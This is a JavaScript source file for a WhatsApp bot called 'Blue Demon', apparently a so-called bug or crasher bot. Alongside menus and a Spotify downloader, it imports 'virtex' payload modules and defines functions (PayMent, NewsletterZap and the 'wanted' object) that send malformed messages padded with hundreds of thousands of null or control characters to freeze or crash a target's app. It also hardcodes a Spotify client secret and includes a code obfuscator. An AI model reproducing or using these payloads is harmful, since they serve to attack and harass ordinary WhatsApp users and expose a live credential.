/*
 CREATOR
 @rafztamvan
*/
module.exports = async (zyn, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await zyn.decodeJid(zyn.user.id)
const sender = m.key.fromMe ? (zyn.user.id.split(':')[0]+'@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./Rafz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Africa/Lagos').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
const botname = "𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍";
const bugres = '𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗶𝗻𝗴 𝘁𝗮𝗿𝗴𝗲𝘁...'
const canvafy = require('canvafy')
 const currentMode = zyn.public ? 'Public' : 'Private';
// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
// auto anti bug
if (global.antibug) {
if (!isGroup && m.isBaileys && m.fromMe) {
await zyn.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*BUG MESSAGE DETECTED*
*Number* ${m.sender.split("@")[0]}`}, {quoted: null})
}}
const themeemoji = "🔪"
// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
function runtime(seconds) {
            let hours = Math.floor(seconds / 3600);
            let minutes = Math.floor((seconds % 3600) / 60);
            let secondsLeft = Math.floor(seconds % 60);

            return `${hours} hrs,${minutes} mins,${secondsLeft} secs`;
        }
let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `blue`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
        }

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'wagwan 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'wagwan  🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'wagwan  🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'wagwan 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'wagwan 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'wagwan 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'wagwan  🌃'
        }
       
    zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
    let id = m.chat
    if (id in zyn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Africa/Lagos"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        zyn.autoshalat[id] = [
            zyn.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
        body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🎧`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: zyn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🩸`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await zyn.sendPresenceUpdate('composing', jid)
      return zyn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			zyn.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel Zynxzo Script`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await zyn.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await zyn.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zyn.getName(i + '@s.whatsapp.net')}\n
FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await zyn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
async function spotifydl(url) {
            return new Promise(async (resolve, reject) => {
                try {
                    const kemii = await axios.get(
                        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`, {
                            headers: {
                                accept: "application/json, text/plain, */*",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                                "sec-ch-ua-mobile": "?1",
                                "sec-ch-ua-platform": "\"Android\"",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "cross-site",
                                Referer: "https://spotifydownload.org/",
                                "Referrer-Policy": "strict-origin-when-cross-origin",
                            },
                        }
                    );
                    const kemi = await axios.get(
                        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`, {
                            headers: {
                                accept: "application/json, text/plain, */*",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                                "sec-ch-ua-mobile": "?1",
                                "sec-ch-ua-platform": "\"Android\"",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "cross-site",
                                Referer: "https://spotifydownload.org/",
                                "Referrer-Policy": "strict-origin-when-cross-origin",
                            },
                        }
                    );
                    const result = {};
                    result.title = kemii.data.result.name;
                    result.type = kemii.data.result.type;
                    result.artis = kemii.data.result.artists;
                    result.durasi = kemii.data.result.duration_ms;
                    result.image = kemii.data.result.image;
                    result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
                    resolve(result);
                } catch (error) {
                    reject(error);
                }
            });
        };
        async function searchSpotify(query) {
            try {
                const access_token = await getAccessToken();
                const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
                    headers: {
                        Authorization: `Bearer ${access_token}`,
                    },
                });
                const data = response.data;
                const tracks = data.tracks.items.map(item => ({
                    name: item.name,
                    artists: item.artists.map(artist => artist.name).join(', '),
                    popularity: item.popularity,
                    link: item.external_urls.spotify,
                    image: item.album.images[0].url,
                    duration_ms: item.duration_ms,
                }));
                return tracks;
            } catch (error) {
                console.error('Error searching Spotify:', error);
                throw 'An error occurred while searching for songs on Spotify.';
            }
        }
        async function getAccessToken() {
            try {
                const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
                const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
                const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
                const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
                    headers: {
                        Authorization: `Basic ${basic}`,
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                });
                const data = response.data;
                return data.access_token;
            } catch (error) {
                console.error('Error getting Spotify access token:', error);
                throw 'An error occurred while obtaining Spotify access token.';
            }
        }
// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!zyn.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"Ɑ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
"*_LOADING_*",
"*_SUKSSES FULL TO KUNTUL VERSION [3.0]_*", 
]
let { key } = await zyn.sendMessage(from, {text: '𝐑'})

for (let i = 0; i < baralod.length; i++) {
await zyn.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
zyn.relayMessage(jid, order.message, { messageId: order.key.id})
}
const bluereply = (teks) => {
            zyn.sendMessage(from, {
                text: teks
            }, {
                quoted: m
            })
        }
// Function Reply
const reply = (teks) => {
            zyn.sendMessage(m.chat, {
                text: teks,
                contextInfo: {
                    mentionedJid: [sender],
                    forwardingScore: 9999999,
                    isForwarded: true,
                    "externalAdReply": {
                        "showAdAttribution": true,
                        "containsAutoReply": true,
                        "title": `ʙʟᴜᴇ ᴄʀᴀꜱʜᴇʀ`,
                        "body": `${ucapanWaktu} ${pushname}`,
                        "previewType": "PHOTO",
                        "thumbnailUrl": `https://l.top4top.io/s_32188bbq00.jpg`, // Replace with your image URL
                        "thumbnail": null, // You can set this to null since you are using thumbnailUrl
                        "sourceUrl": `${isLink}`
                    }
                }
            }, {
                quoted: m
            });
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
zyn.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
zyn.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
                darkphonk = fs.readFileSync('./database/Phonk.mp3')
                const version = require("baileys/package.json").version;
                const menu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐
\`💞𝕻𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊💞\`

         *𝖜𝖍𝖔 𝖉𝖆𝖗𝖊𝖘*
  『〆⑆  *ᴀʟʟᴍᴇɴᴜ* 』
  『〆⑆  *ʙᴜɢᴍᴇɴᴜ* 』
  『〆⑆  *ʙʟᴜᴇʙᴜᴛᴛᴏɴ* 』
  『〆⑆  *ꜱᴘᴇᴄɪᴀʟᴍᴇɴᴜ* 』
> ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴅᴇᴘʟᴏʏɪɴɢ 
> ᴛʏᴘᴇ ʀᴜʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ʀᴜʟᴇꜱ 
`;

                let listMessage = {
                    text: menu, // Include the menu text in the message
                    title: '𝗠𝗘𝗡𝗨͖'
                };

                let freesex = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    externalAdReply: {
                                        showAdAttribution: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: menu
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: ''
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: true,
                                    ...(await prepareWAMessageMedia({
                                        image: await fs.readFileSync("./database/image/xbug.jpg")
                                    }, {
                                        upload: zyn.waUploadToServer
                                    }))
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [{
                                        "name": "cta_url",
                                        "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
                                    }]
                                })
                            })
                        }
                    }
                }, {
                    userJid: m.sender,
                    quoted: m
                })
                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
                    messageId: freesex.key.id
                })
                await zyn.sendMessage(m.chat, {
                    audio: darkphonk,
                    mimetype: 'audio/mp4',
                    ptt: true
                }, {
                    quoted: m
                })
            }
            break
case 'bluemenu':
            case 'allmenu': {
                const version = require("baileys/package.json").version;
                let run = runtime(process.uptime());

                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐

┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴀᴅᴅᴏᴡɴᴇʀ
│ ⑄ ᴀᴅᴅᴘʀᴇᴍ
│ ⑄ ɢᴇᴛᴏᴡɴᴇʀ 
│ ⑄ ɢᴇᴛᴘʀᴇᴍ
│ ⑄ ᴅᴇʟᴏᴡɴᴇʀ
│ ⑄ ᴅᴇʟᴘʀᴇᴍ
│ ⑄ ᴘᴜʙʟɪᴄ
│ ⑄ sᴇʟғ
│ ⑄ ᴘɪɴɢ
│ ⑄ ʙʟᴏᴄᴋ 
│ ⑄ ᴜɴʙʟᴏᴄᴋ 
│ ⑄ ᴍᴏᴅᴇ
│ ⑄ ᴅᴇʟ
│ ⑄ ᴊᴏɪɴ
│ ⑄ ᴄʟᴇᴀʀᴄʜᴀᴛ
│ ⑄ ꜱᴇᴛʙɪᴏ
│ ⑄ ʀᴇꜱᴛᴀʀᴛ
┗─────────────❐

┏─『 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑𝐒\` 』
